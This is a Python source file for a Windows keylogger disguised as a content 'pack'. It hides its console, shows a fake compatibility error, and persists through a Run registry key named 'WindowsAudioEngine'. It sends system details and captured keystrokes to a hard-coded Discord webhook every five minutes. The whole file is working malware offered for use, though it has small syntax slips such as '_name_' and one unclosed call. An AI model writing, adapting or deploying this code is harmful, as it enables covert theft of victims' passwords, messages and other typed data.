import os
import sys
import ctypes
import requests
import socket
import getpass
import time
import platform
from pynput import keyboard

# ===== CONFIGURATION ===== #
WEBHOOK_URL = "https://discord.com/api/webhooks/1397641053548318873/Iw7Yi9YjtUB0z4_bd0fMoQu7-edCCpF3HBA3mGL_FHjjJ-6Rn3QSEQSQDpC81vihuk64"  # REPLACE THIS
# ======================== #

# Hide the console window immediately
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def show_fake_error():
    ctypes.windll.user32.MessageBoxW(
        0,
        "This pack is not compatible with your device",
        "Compatibility Error",
        0x10  # Error icon
    )

def get_system_info():
    return (
        f"💻 New Device Activated\n"
        f"🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"👤 User: {getpass.getuser()}\n"
        f"🏷 Hostname: {socket.gethostname()}\n"
        f"🌐 IP: {socket.gethostbyname(socket.gethostname())}\n"
        f"🔧 OS: {platform.platform()}\n"
        f"🔋 VM: {'Yes' if 'vmware' in platform.platform().lower() or 'virtual' in platform.platform().lower() else 'No'}"
    )

def persist():
    # Add to startup registry (more reliable than startup folder)
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "WindowsAudioEngine"
    
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key,
            value_name,
            0,
            winreg.REG_SZ,
            os.path.abspath(sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass

def start_keylogger():
    log = ""
    last_sent = time.time()
    
    def on_press(key):
        nonlocal log, last_sent
        try:
            log += key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "[BS]",
                keyboard.Key.tab: "[TAB]"
            }
            log += special_keys.get(key, f"[{key.name}]")
        
        if time.time() - last_sent > 300:  # 5 minutes
            if log.strip():
                try:
                    requests.post(WEBHOOK_URL, json={
                        "content": f"📝 Keystrokes from {getpass.getuser()}:\n{log}"
                    })
                except:
                    pass
                log = ""
                last_sent = time.time()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if _name_ == "_main_":
    show_fake_error()  # Display fake error message
    persist()  # Install persistence
    requests.post(WEBHOOK_URL, json={"content": get_system_info()})  # Send system info
    start_keylogger()  # Begin keylogging